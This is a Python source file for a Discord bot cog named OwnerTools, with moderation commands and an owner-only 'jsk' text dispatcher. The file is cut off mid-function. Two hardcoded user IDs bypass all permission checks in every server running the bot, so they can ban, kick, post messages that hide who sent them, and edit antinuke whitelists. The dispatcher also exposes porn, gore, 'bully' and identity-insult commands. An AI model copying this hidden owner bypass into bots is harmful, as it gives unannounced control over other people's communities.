import discord
from discord.ext import commands
import json
from datetime import datetime, timedelta, timezone
from typing import Optional, List
import platform
import sys

OWNER_IDS: List[int] = [386889350010634252, 164202861356515328, ]
VERSION = "Wizard 1.0"

class OwnerTools(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ---------- Utilities ----------
    @staticmethod
    def is_owner(user: discord.abc.User) -> bool:
        return int(user.id) in OWNER_IDS

    @staticmethod
    def is_second_owner(guild_id: int, user_id: int) -> bool:
        try:
            with open('second_owners.json', 'r') as f:
                data = json.load(f)
            return str(user_id) == data.get(str(guild_id))
        except Exception:
            return False

    def is_admin_owner_or_sso(self, ctx: commands.Context) -> bool:
        if ctx.guild is None:
            return False
        if self.is_owner(ctx.author):
            return True
        if ctx.author.id == ctx.guild.owner_id:
            return True
        if ctx.author.guild_permissions.administrator:
            return True
        if self.is_second_owner(ctx.guild.id, ctx.author.id):
            return True
        return False

    @staticmethod
    def parse_duration(text: str) -> Optional[timedelta]:
        """Parse durations like 30s, 10m, 2h, 1d and synonyms (sec, second, min, minute, hr, hour, day)."""
        if not text:
            return None
        try:
            text = str(text).strip().lower()
            import re
            m = re.match(r"^\s*([0-9]+(?:\.[0-9]+)?)\s*([a-z]+)?\s*$", text)
            if not m:
                return None
            value = float(m.group(1))
            unit = (m.group(2) or 's').lower()
            # Normalize unit
            if unit in ('s', 'sec', 'second', 'seconds'):
                return timedelta(seconds=value)
            if unit in ('m', 'min', 'mins', 'minute', 'minutes'):
                return timedelta(minutes=value)
            if unit in ('h', 'hr', 'hour', 'hours'):
                return timedelta(hours=value)
            if unit in ('d', 'day', 'days'):
                return timedelta(days=value)
            # Unknown unit -> seconds
            return timedelta(seconds=value)
        except Exception:
            return None

    # ---------- Version reporting ----------
    def build_version_report(self) -> str:
        lines: List[str] = []
        lines.append(f"Bot: {VERSION}")
        lines.append(f"Python: {sys.version.split()[0]} ({platform.python_implementation()})")
        lines.append(f"discord.py: {getattr(discord, '__version__', 'unknown')}")
        try:
            import aiohttp
            lines.append(f"aiohttp: {getattr(aiohttp, '__version__', 'unknown')}")
        except Exception:
            lines.append("aiohttp: not installed")
        lines.append(f"System: {platform.system()} {platform.release()} ({platform.machine()})")
        # Loaded cogs
        if self.bot.cogs:
            lines.append("Cogs: " + ", ".join(sorted(self.bot.cogs.keys())))
        return "\n".join(lines)

    # ---------- Prefix moderation commands (with owner bypass) ----------
    @commands.command(name="ban")
    async def ban_cmd(self, ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided") -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        if member.id == ctx.guild.owner_id or member.top_role >= ctx.me.top_role:
            await ctx.send("I cannot ban this member due to role hierarchy.")
            return
        try:
            await member.ban(reason=reason, delete_message_days=0)
            await ctx.send(f"🔨 Banned {member.mention} | Reason: {reason}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to ban this member.")

    @commands.command(name="kick")
    async def kick_cmd(self, ctx: commands.Context, member: discord.Member, *, reason: str = "No reason provided") -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        if member.id == ctx.guild.owner_id or member.top_role >= ctx.me.top_role:
            await ctx.send("I cannot kick this member due to role hierarchy.")
            return
        try:
            await member.kick(reason=reason)
            await ctx.send(f"👢 Kicked {member.mention} | Reason: {reason}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to kick this member.")

    @commands.command(name="unban")
    async def unban_cmd(self, ctx: commands.Context, user: discord.User, *, reason: str = "Unban requested") -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        try:
            await ctx.guild.unban(user, reason=reason)
            await ctx.send(f"✅ Unbanned {user.mention}.")
        except discord.NotFound:
            await ctx.send("This user is not banned.")
        except discord.Forbidden:
            await ctx.send("I don't have permission to unban this user.")

    @commands.command(name="mute")
    async def mute_cmd(self, ctx: commands.Context, member: discord.Member, duration: str, *, reason: str = "No reason provided") -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        delta = self.parse_duration(duration)
        if not delta:
            await ctx.send("Invalid duration. Use formats like 30s, 10m, 2h, 1d.")
            return
        until = datetime.now(timezone.utc) + delta
        try:
            await member.timeout(until, reason=reason)
            await ctx.send(f"🔇 Muted {member.mention} for {duration} | Reason: {reason}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to mute this member.")

    @commands.command(name="unmute")
    async def unmute_cmd(self, ctx: commands.Context, member: discord.Member) -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        try:
            await member.timeout(None, reason="Unmute")
            await ctx.send(f"🔊 Unmuted {member.mention}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to unmute this member.")

    # --- Timeout commands (prefix and JSK supported) ---
    @commands.command(name="timeout")
    async def timeout_cmd(self, ctx: commands.Context, member: discord.Member, duration: str, *, reason: str = "No reason provided") -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        delta = self.parse_duration(duration)
        if not delta:
            await ctx.send("Invalid duration. Examples: 30s, 10m, 2h, 1d (also supports sec/min/hr/day words).")
            return
        until = datetime.now(timezone.utc) + delta
        try:
            await member.timeout(until, reason=reason)
            await ctx.send(f"⏳ Timed out {member.mention} for {duration} | Reason: {reason}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to timeout this member.")

    @commands.command(name="untimeout")
    async def untimeout_cmd(self, ctx: commands.Context, member: discord.Member) -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        try:
            await member.timeout(None, reason="Untimeout")
            await ctx.send(f"✅ Removed timeout for {member.mention}")
        except discord.Forbidden:
            await ctx.send("I don't have permission to modify this member's timeout.")

    @commands.command(name="strip")
    async def strip_cmd(self, ctx: commands.Context, member: discord.Member) -> None:
        if not self.is_admin_owner_or_sso(ctx):
            await ctx.send("Only Admins, Guild Owner, or Second Owner can use this.")
            return
        roles_to_remove = [r for r in member.roles if r.name != "@everyone" and r < ctx.me.top_role]
        try:
            await member.remove_roles(*roles_to_remove, reason=f"Strip by {ctx.author}")
            await ctx.send(f"🧹 Removed {len(roles_to_remove)} roles from {member.mention}.")
        except discord.Forbidden:
            await ctx.send("I don't have permission to remove one or more roles.")

    # ---------- Owner-only JSK dispatcher ----------
    @commands.Cog.listener()
    async def on_message(self, message: discord.Message) -> None:
        if message.author.bot or message.guild is None:
            return
        if not self.is_owner(message.author):
            return
        content = message.content.strip()
        if not content.lower().startswith("jsk"):
            return
        # Strip the leading keyword and split
        rest = content[3:].strip()
        if not rest:
            await message.channel.send("JSK ready. Examples: jsk quote | jsk version | jsk jail set | jsk jail @user spamming | jsk role all @role | jsk role human @role | jsk role bot @role | jsk role remove all @role | jsk role remove human @role | jsk role remove bot @role | jsk hide #channel | jsk lock #channel | jsk unlock #channel | jsk unhide #channel | jsk av @user | jsk banner @user | jsk setbutton <msg_id> <role> <emoji> | jsk reroll <msg_id> | jsk message send [<#channel>] <message> | jsk ai enable | jsk ai breathe | jsk ai llama <question> | jsk ai deepseek <question> | jsk ai qwen <question> | jsk ai xyn <prompt> | jsk ai <question>")
            return

        # Build a context for invoking commands
        ctx = await self.bot.get_context(message)
        tokens = rest.split()
        head = tokens[0].lower()
        args = tokens[1:]

        try:
            # jsk message send <message> or jsk message send #channel <message>
            if head == "message" and args and args[0].lower() == "send":
                if len(args) >= 3:
                    # Check if second argument is a channel
                    try:
                        ch = await commands.TextChannelConverter().convert(ctx, args[1])
                        message_text = " ".join(args[2:])
                        target_channel = ch
                    except Exception:
                        # Not a channel, treat as message
                        message_text = " ".join(args[1:])
                        target_channel = message.channel
                else:
                    message_text = " ".join(args[1:]) if len(args) >= 2 else None
                    target_channel = message.channel
                
                if not message_text:
                    await message.channel.send("Usage: jsk message send [<#channel>] <message>")
                    return
                
                try:
                    # Delete the command message
                    await message.delete()
                    # Send the message to target channel
                    await target_channel.send(message_text)
                except discord.Forbidden:
                    await message.channel.send("❌ I don't have permission to send messages in that channel.")
                except Exception as e:
                    await message.channel.send(f"❌ An error occurred: {e}")
                return
            
            # jsk set vc | voicemaster | voice
            if head == "set" and args and args[0].lower() in ("voicemaster", "vc", "voice"):
                cmd = self.bot.get_command("vm_set")
                if cmd:
                    try:
                        await cmd.callback(cmd.cog, ctx)  # type: ignore
                    except Exception as e:
                        await message.channel.send(f"Error: {e}")
                return
            # jsk set welcome [#channel]
            # jsk set welcome message [#channel] <text>
            if head == "set" and args and args[0].lower() in ("welcome", "wl", "wlcm"):
                # If 'message' mode requested
                if len(args) >= 2 and args[1].lower() in ("message", "msg", "text"):
                    # Resolve channel if provided
                    ch = None
                    if len(args) >= 3:
                        try:
                            ch = await commands.TextChannelConverter().convert(ctx, args[2])
                        except Exception:
                            ch = None
                    if ch is None:
                        ch = message.channel
                    msg_text = " ".join(args[3:]) if len(args) >= 4 else "{user.mention} welcome to {guild.name}!"
                    cmd2 = self.bot.get_command("setwelcome")
                    if cmd2:
                        try:
                            await ctx.invoke(cmd2, channel=ch, message=msg_text)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # Default: embed mode setup with optional channel
                ch = None
                if len(args) >= 2:
                    try:
                        ch = await commands.TextChannelConverter().convert(ctx, args[1])
                    except Exception:
                        ch = None
                if ch is None:
                    ch = message.channel
                cmd = self.bot.get_command("welcome set")
                if cmd:
                    try:
                        await ctx.invoke(cmd, channel=ch, state="on")
                    except Exception as e:
                        await message.channel.send(f"Error: {e}")
                return
            
            # jsk welcome commands
            if head in ("welcome", "wl", "wlcm") and args:
                sub = args[0].lower()
                # jsk welcome mode <mode>
                if sub == "mode":
                    mode = args[1].lower() if len(args) >= 2 else None
                    cmd = self.bot.get_command("welcome mode")
                    if cmd and mode:
                        try:
                            await ctx.invoke(cmd, mode=mode)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome message <text>
                elif sub == "message":
                    text = " ".join(args[1:]) if len(args) >= 2 else None
                    cmd = self.bot.get_command("welcome message")
                    if cmd and text:
                        try:
                            await ctx.invoke(cmd, text=text)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome title <text>
                elif sub == "title":
                    text = " ".join(args[1:]) if len(args) >= 2 else None
                    cmd = self.bot.get_command("welcome title")
                    if cmd and text:
                        try:
                            await ctx.invoke(cmd, text=text)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome description <text>
                elif sub in ("description", "desc"):
                    text = " ".join(args[1:]) if len(args) >= 2 else None
                    cmd = self.bot.get_command("welcome description")
                    if cmd and text:
                        try:
                            await ctx.invoke(cmd, text=text)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome color <hex>
                elif sub == "color":
                    color = args[1] if len(args) >= 2 else None
                    cmd = self.bot.get_command("welcome color")
                    if cmd and color:
                        try:
                            await ctx.invoke(cmd, hex_or_int=color)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome banner <url>
                elif sub == "banner":
                    url = args[1] if len(args) >= 2 else None
                    cmd = self.bot.get_command("welcome banner")
                    if cmd and url:
                        try:
                            await ctx.invoke(cmd, url_or_off=url)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome button <text> <url> (legacy)
                elif sub == "button":
                    if len(args) >= 3:
                        button_text = args[1]
                        button_url = args[2]
                        cmd = self.bot.get_command("welcome button")
                        if cmd:
                            try:
                                await ctx.invoke(cmd, text_or_emoji=button_text, url=button_url)
                            except Exception as e:
                                await message.channel.send(f"Error: {e}")
                    elif len(args) >= 2 and args[1].lower() == "remove":
                        cmd = self.bot.get_command("welcome button")
                        if cmd:
                            try:
                                await ctx.invoke(cmd, text_or_emoji="remove")
                            except Exception as e:
                                await message.channel.send(f"Error: {e}")
                    return
                
                # jsk welcome button1/button2/button3/button4/button5 <text> <url>
                elif sub.startswith("button") and sub[6:].isdigit() and 1 <= int(sub[6:]) <= 5:
                    button_num = int(sub[6:])
                    if len(args) >= 3:
                        button_text = args[1]
                        button_url = args[2]
                        cmd = self.bot.get_command(f"welcome button{button_num}")
                        if cmd:
                            try:
                                await ctx.invoke(cmd, text_or_emoji=button_text, url=button_url)
                            except Exception as e:
                                await message.channel.send(f"Error: {e}")
                    elif len(args) >= 2 and args[1].lower() == "remove":
                        cmd = self.bot.get_command(f"welcome button{button_num}")
                        if cmd:
                            try:
                                await ctx.invoke(cmd, text_or_emoji="remove")
                            except Exception as e:
                                await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome status
                elif sub == "status":
                    cmd = self.bot.get_command("welcome status")
                    if cmd:
                        try:
                            await ctx.invoke(cmd)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome preview
                elif sub == "preview":
                    cmd = self.bot.get_command("welcome preview")
                    if cmd:
                        try:
                            await ctx.invoke(cmd)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk welcome remove
                elif sub == "remove":
                    cmd = self.bot.get_command("welcome remove")
                    if cmd:
                        try:
                            await ctx.invoke(cmd)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
            # jsk voice set/enable/status/panel ... and voice power/mute/defan/...
            # jsk vm set/status/panel ...
            if head in ("vm", "voice", "vc", "voicemaster") and args:
                sub = args[0].lower()
                # jsk voice power enable|disable
                if sub == "power":
                    cmd = self.bot.get_command("voice power")
                    if cmd:
                        action = args[1].lower() if len(args) >= 2 else None
                        try:
                            await ctx.invoke(cmd, action=action)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk voice mute|unmute|defan|undefan|disconnect @user
                if sub in ("mute", "unmute", "defan", "undefan", "disconnect"):
                    cmd = self.bot.get_command(f"voice {sub}")
                    if cmd:
                        target = None
                        if len(args) >= 2:
                            try:
                                target = await commands.MemberConverter().convert(ctx, args[1])
                            except Exception:
                                target = None
                        try:
                            if target is not None:
                                await ctx.invoke(cmd, member=target)
                            else:
                                await ctx.invoke(cmd)
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk voice set|enable
                if sub in ("set", "create", "enable", "enble"):
                    cmd = self.bot.get_command("vm_set")
                    if cmd:
                        try:
                            await cmd.callback(cmd.cog, ctx)  # type: ignore
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # jsk voice status
                if sub in ("status",):
                    cmd = self.bot.get_command("vm_status")
                    if cmd:
                        try:
                            await cmd.callback(cmd.cog, ctx)  # type: ignore
                        except Exception as e:
                            await message.channel.send(f"Error: {e}")
                    return
                # Resolve target voice channel: user's current VC by default
                target_vc = None
                author_voice = message.author.voice.channel if message.author.voice else None  # type: ignore
                if len(args) >= 2:
                    # allow channel mention or id
                    try:
                        cid = int(args[1].strip("<#>"))
                        ch = message.guild.get_channel(cid)
                        if isinstance(ch, discord.VoiceChannel):
                            target_vc = ch
                    except Exception:
                        target_vc = None
                if target_vc is None and isinstance(author_voice, discord.VoiceChannel):
                    target_vc = author_voice
                # vm panel: re-post VoiceMaster panel into the VC's chat using current owner or author
                if sub == "panel":
                    if not target_vc:
                        await message.channel.send("Join a voice channel or provide a voice channel ID/mention.")
                        return
                    # Determine owner: keep existing or use author
                    cog = self.bot.get_cog("VoiceMaster")
                    if cog is None:
                        await message.channel.send("VoiceMaster is not loaded.")
                        return
                    from cmds.voicemaster import VoiceMaster as _VM  # type: ignore
                    vm: _VM = cog  # type: ignore
                    owner_id = vm.owner_by_channel.get(target_vc.id, message.author.id)
                    owner = message.guild.get_member(owner_id) or message.author
                    embed, view = vm.build_panel(owner, target_vc.id)
                    try:
                        await target_vc.send(embed=embed, view=view)  # type: ignore
                        await message.add_reaction("✅")
                    except Exception as e:
                        await message.channel.send(f"Failed to send panel: {e}")
                    return
            if head == "version":
                await message.channel.send(self.build_version_report())
                return
            # ----- JSK AI shortcuts -----
            if head == "ai":
                ctx = await self.bot.get_context(message)
                if args and args[0].lower() == "enable":
                    cmd = self.bot.get_command("ai enable")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                elif args and args[0].lower() == "breathe":
                    cmd = self.bot.get_command("ai breathe")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                elif args and args[0].lower() == "deepseek":
                    question = " ".join(args[1:]) if len(args) >= 2 else None
                    if not question:
                        await message.channel.send("Usage: jsk ai deepseek <question>")
                        return
                    cmd = self.bot.get_command("ai deepseek")
                    if cmd:
                        await ctx.invoke(cmd, question=question)
                    return
                elif args and args[0].lower() == "qwen":
                    question = " ".join(args[1:]) if len(args) >= 2 else None
                    if not question:
                        await message.channel.send("Usage: jsk ai qwen <question>")
                        return
                    cmd = self.bot.get_command("ai qwen")
                    if cmd:
                        await ctx.invoke(cmd, question=question)
                    return
                elif args and args[0].lower() == "llama":
                    question = " ".join(args[1:]) if len(args) >= 2 else None
                    if not question:
                        await message.channel.send("Usage: jsk ai llama <question>")
                        return
                    cmd = self.bot.get_command("ai llama")
                    if cmd:
                        await ctx.invoke(cmd, question=question)
                    return
                elif args and args[0].lower() == "xyn":
                    prompt = " ".join(args[1:]) if len(args) >= 2 else None
                    if not prompt:
                        await message.channel.send("Usage: jsk ai xyn <prompt>")
                        return
                    cmd = self.bot.get_command("ai xyn")
                    if cmd:
                        await ctx.invoke(cmd, prompt=prompt)
                    return
                # Treat the rest as a question (can be empty -> smalltalk prompt handler)
                question = " ".join(args) if args else None
                cmd = self.bot.get_command("ai")
                if cmd:
                    await ctx.invoke(cmd, question=question)
                return
            # ----- JSK premium activation -----
            if head == "premium" and args:
                sub = args[0].lower()
                if sub == "activate" and len(args) >= 2:
                    try:
                        guild_id = int(args[1])
                    except Exception:
                        await message.channel.send("Provide a valid server ID.")
                        return
                    # parse period (optional)
                    period = args[2].lower() if len(args) >= 3 else "1mon"
                    months_map = {
                        '1mon': 1, '1m': 1,
                        '3mon': 3, '3m': 3,
                        '6mon': 6, '6m': 6,
                        '1year': 12, '12m': 12,
                    }
                    months = months_map.get(period, 1)
                    from datetime import datetime, timezone
                    import json, os
                    PREMIUM_FILE = 'premium_config.json'
                    def _load():
                        try:
                            if os.path.exists(PREMIUM_FILE):
                                with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
                                    return json.load(f)
                        except Exception:
                            pass
                        return {}
                    def _save(data):
                        try:
                            with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
                                json.dump(data, f, indent=2)
                        except Exception:
                            pass
                    cfg = _load()
                    from datetime import timedelta
                    expires = datetime.now(timezone.utc) + timedelta(days=30*months)
                    entry = cfg.setdefault(str(guild_id), {})
                    entry['activated_by'] = int(message.author.id)
                    entry['activated_at'] = int(datetime.now(timezone.utc).timestamp())
                    entry['expires_at'] = int(expires.timestamp())
                    entry.setdefault('features', {})
                    _save(cfg)
                    await message.channel.send(f"Premium activated for {guild_id} for {months} month(s). Expires <t:{int(expires.timestamp())}:R>.")
                    return
            # ----- JSK Vanity shortcuts -----
            if head == "vanity":
                ctx = await self.bot.get_context(message)
                args_l = args
                if not args_l:
                    await message.channel.send("Usage: jsk vanity enable|disable|status|role @role|message <text>|message send #channel <text>")
                    return
                sub = args_l[0].lower()
                def _get(cmd_name: str):
                    return self.bot.get_command(cmd_name)
                if sub == "enable":
                    cmd = _get("vanity enable")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if sub == "disable":
                    cmd = _get("vanity disable")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if sub == "status":
                    cmd = _get("vanity status")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if sub == "role" and len(args_l) >= 2:
                    try:
                        role = await commands.RoleConverter().convert(ctx, args_l[1])
                    except Exception:
                        await message.channel.send("Provide a valid role.")
                        return
                    cmd = _get("vanity role")
                    if cmd:
                        await ctx.invoke(cmd, role=role)
                    return
                if sub == "message" and len(args_l) >= 2:
                    if args_l[1].lower() == "send" and len(args_l) >= 4:
                        try:
                            ch = await commands.TextChannelConverter().convert(ctx, args_l[2])
                        except Exception:
                            await message.channel.send("Provide a valid channel.")
                            return
                        text = " ".join(args_l[3:])
                        cmd = _get("vanity message send")
                        if cmd:
                            await ctx.invoke(cmd, channel=ch, text=text)
                        return
                    # fallback: set match message
                    text = " ".join(args_l[1:])
                    cmd = _get("vanity message")
                    if cmd:
                        await ctx.invoke(cmd, text=text)
                    return
            # ----- JSK Booster shortcuts -----
            if head == "booster":
                ctx = await self.bot.get_context(message)
                if not args:
                    await message.channel.send("Usage: jsk booster enable|disable|status|message #channel <text>")
                    return
                sub = args[0].lower()
                def _get(cmd_name: str):
                    return self.bot.get_command(cmd_name)
                if sub == "enable":
                    cmd = _get("booster enable")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if sub == "disable":
                    cmd = _get("booster disable")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if sub == "status":
                    cmd = _get("booster status")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if sub == "message" and len(args) >= 3:
                    try:
                        ch = await commands.TextChannelConverter().convert(ctx, args[1])
                    except Exception:
                        await message.channel.send("Provide a valid channel.")
                        return
                    text = " ".join(args[2:])
                    cmd = _get("booster message")
                    if cmd:
                        await ctx.invoke(cmd, channel=ch, text=text)
                    return
            if head == "quote":
                cmd = self.bot.get_command("quote")
                if cmd:
                    await ctx.invoke(cmd)
                return
            if head == "help":
                cmd = self.bot.get_command("bothelp")
                if cmd:
                    await ctx.invoke(cmd)
                return
            # ---- JSK fun/nsfw shortcuts ----
            if head == "nsfw":
                if args and args[0].lower() == "enable":
                    cmd = self.bot.get_command("nsfw enable")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if args and args[0].lower() == "send":
                    cmd = self.bot.get_command("nsfw send")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                return
            if head in ("slap", "punch", "gay", "trans", "fuck"):
                target = None
                if args:
                    try:
                        target = await commands.MemberConverter().convert(ctx, args[0])
                    except Exception:
                        target = None
                cmd = self.bot.get_command(head)
                if cmd:
                    if target is not None:
                        await ctx.invoke(cmd, member=target)
                    else:
                        await ctx.invoke(cmd)
                return
            if head == "gore":
                a = None
                b = None
                if args:
                    try:
                        a = await commands.MemberConverter().convert(ctx, args[0])
                    except Exception:
                        a = None
                if len(args) >= 2:
                    try:
                        b = await commands.MemberConverter().convert(ctx, args[1])
                    except Exception:
                        b = None
                cmd = self.bot.get_command("gore")
                if cmd:
                    await ctx.invoke(cmd, attacker=a, victim=b)
                return
            if head in ("gayporn", "lesbianporn", "transporn", "hentai"):
                cmd = self.bot.get_command(head)
                if cmd:
                    await ctx.invoke(cmd)
                return
            # ---- JSK join shortcuts ----
            if head == "join" and args:
                ctx = await self.bot.get_context(message)
                sub = args[0].lower()
                def _get(n: str):
                    return self.bot.get_command(n)
                if sub == "status":
                    cmd = _get("join status")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if sub in ("human", "bot") and len(args) >= 2:
                    sub2 = args[1].lower()
                    if sub2 == "add" and len(args) >= 3:
                        # Convert each token to a Role object
                        roles_list = []
                        for tok in args[2:]:
                            try:
                                role = await commands.RoleConverter().convert(ctx, tok)
                                roles_list.append(role)
                            except Exception:
                                continue
                        cmd = _get(f"join {sub} add")
                        if cmd:
                            await ctx.invoke(cmd, roles=roles_list)
                        return
                    if sub2 == "remove" and len(args) >= 3:
                        roles_list = []
                        for tok in args[2:]:
                            try:
                                role = await commands.RoleConverter().convert(ctx, tok)
                                roles_list.append(role)
                            except Exception:
                                continue
                        cmd = _get(f"join {sub} remove")
                        if cmd:
                            await ctx.invoke(cmd, roles=roles_list)
                        return
                    if sub2 == "disable":
                        cmd = _get(f"join {sub} disable")
                        if cmd:
                            await ctx.invoke(cmd)
                        return
            # ---- JSK manage shortcuts ----
            if head in ("hide", "unhide", "lock", "unlock"):
                ctx = await self.bot.get_context(message)
                # Allow optional #channel (text or voice)
                target_ch = None
                if args:
                    try:
                        # Try text channel first, then voice channel
                        try:
                            target_ch = await commands.TextChannelConverter().convert(ctx, args[0])
                        except:
                            try:
                                target_ch = await commands.VoiceChannelConverter().convert(ctx, args[0])
                            except:
                                target_ch = None
                    except Exception:
                        target_ch = None
                cmd = self.bot.get_command(head)
                if cmd:
                    if target_ch:
                        await ctx.invoke(cmd, channel=target_ch)
                    else:
                        await ctx.invoke(cmd)
                return
            if head == "nick" and args:
                # jsk nick @user <nick>
                try:
                    member = await commands.MemberConverter().convert(ctx, args[0])
                except Exception:
                    await message.channel.send("Provide a valid member.")
                    return
                new_nick = " ".join(args[1:]) if len(args) > 1 else None
                if not new_nick:
                    await message.channel.send("Provide a nickname.")
                    return
                cmd = self.bot.get_command("nick")
                if cmd:
                    await ctx.invoke(cmd, member=member, new_nick=new_nick)
                return
            if head == "steal":
                # jsk steal [<emoji> [name]]; supports reply with no args
                cmd = self.bot.get_command("steal")
                if cmd:
                    if args:
                        name = None
                        if len(args) >= 2:
                            name = " ".join(args[1:])
                        await ctx.invoke(cmd, emoji=args[0], name=name)
                    else:
                        await ctx.invoke(cmd)
                return
            if head == "antinuke":
                # owner-only jsk antinuke ... passthrough
                if args and args[0].lower() in ("enable", "disable", "status"):
                    cmd = self.bot.get_command(f"antinuke {args[0].lower()}")
                    if cmd:
                        await ctx.invoke(cmd)
                    return
                if args and args[0].lower() == "whitelist" and len(args) >= 3:
                    sub = args[1].lower()
                    if sub in ("add", "remove"):
                        try:
                            member = await commands.MemberConverter().convert(ctx, args[2])
                        except Exception:
                            await message.channel.send("Provide a valid member to whitelist.")
                            return
                        cmd = self.bot.get_command(f"antinuke whitelist {sub}")
                        if cmd:
                            await ctx.invoke(cmd, member=member)
                        return
                if args:
                    # jsk antinuke config <freeform>
                    cmd = self.bot.get_command("antinuke config")
                    if cmd:
                        await ctx.invoke(cmd, text=" ".join(args))
                    return
            if head in ("welcome", "wl", "wlcm") and args:
                sub = args[0].lower()
                try:
                    # welcome set [#channel] [on|off]
                    if sub == "set":
                        ch = None
                        state = None
                        if len(args) >= 2:
                            try:
                                ch = await commands.TextChannelConverter().convert(ctx, args[1])
                            except Exception:
                                ch = None
                        if len(args) >= 3:
                            state = args[2]
                        if ch is None:
                            ch = message.channel
                        cmd = self.bot.get_command("welcome set")
                        if cmd:
                            await ctx.invoke(cmd, channel=ch, state=state)
                        return
                    # welcome mode [embed|message]
                    if sub == "mode" and len(args) >= 2:
                        cmd = self.bot.get_command("welcome mode")
                        if cmd:
                            await ctx.invoke(cmd, mode=args[1])
                        return
                    # welcome message <text>
                    if sub == "message" and len(args) >= 2:
                        cmd = self.bot.get_command("welcome message")
                        if cmd:
                            await ctx.invoke(cmd, text=" ".join(args[1:]))
                        return
                    # welcome title <text>
                    if sub == "title" and len(args) >= 2:
                        cmd = self.bot.get_command("welcome title")
                        if cmd:
                            await ctx.invoke(cmd, text=" ".join(args[1:]))
                        return
                    # welcome description <text>
                    if sub in ("description", "desc") and len(args) >= 2:
                        cmd = self.bot.get_command("welcome description")
                        if cmd:
                            await ctx.invoke(cmd, text=" ".join(args[1:]))
                        return
                    # welcome footer [on|off]
                    if sub == "footer":
                        toggle = None
                        if len(args) >= 2 and args[1].lower() in ("on", "off", "true", "false", "enable", "disable"):
                            toggle = args[1]
                        cmd = self.bot.get_command("welcome footer")
                        if cmd:
                            await ctx.invoke(cmd, toggle=toggle)
                        return
                    # welcome banner <url|off>
                    if sub == "banner" and len(args) >= 2:
                        cmd = self.bot.get_command("welcome banner")
                        if cmd:
                            await ctx.invoke(cmd, url_or_off=" ".join(args[1:]))
                        return
                    # welcome color <#hex>
                    if sub == "color" and len(args) >= 2:
                        cmd = self.bot.get_command("welcome color")
                        if cmd:
                            await ctx.invoke(cmd, hex_or_int=args[1])
                        return
                    # welcome mod @role
                    if sub == "mod" and len(args) >= 2:
                        try:
                            role = await commands.RoleConverter().convert(ctx, args[1])
                        except Exception:
                            await message.channel.send("Provide a valid role.")
                            return
                        cmd = self.bot.get_command("welcome mod")
                        if cmd:
                            await ctx.invoke(cmd, role=role)
                        return
                    # welcome remove
                    if sub == "remove":
                        cmd = self.bot.get_command("welcome remove")
                        if cmd:
                            await ctx.invoke(cmd)
                        return
                except Exception as e:
                    await message.channel.send(f"Error: {e}")
                return
            if head == "setwelcome":
                # jsk setwelcome #channel [message]
                ch = None
                msg_text = None
                if args:
                    try:
                        ch = await commands.TextChannelConverter().convert(ctx, args[0])
                        msg_text = " ".join(args[1:]) if len(args) > 1 else None
                    except Exception:
                        ch = message.channel
                        msg_text = " ".join(args)
                else:
                    ch = message.channel
                cmd = self.bot.get_command("setwelcome")
                if cmd:
                    try:
                        await ctx.invoke(cmd, channel=ch, message=msg_text)
                    except Exception as e:
                        await message.channel.send(f"Error: {e}")
                return
            if head in ("bi", "botinfo"):
                cmd = self.bot.get_command("botinfo") or self.bot.get_command("bi")
                if cmd:
                    await ctx.invoke(cmd)
                return
            if head == "bully" and args:
                try:
                    member = await commands.MemberConverter().convert(ctx, args[0])
                except commands.MemberNotFound:
                    await message.channel.send("User not found.")
                    return
                cmd = self.bot.get_command("bully")
                if cmd:
                    await ctx.invoke(cmd, member=member)
                return
            if head == "jail":
                # Subroutes: set, status, @user, unjail @user
                if len(args) >= 1 and args[0].lower() == "set":
                    # Prefer voicemaster setup if second arg matches
                    if len(args) >= 2 and args[1].lower() in ("voicemaster", "vc"):
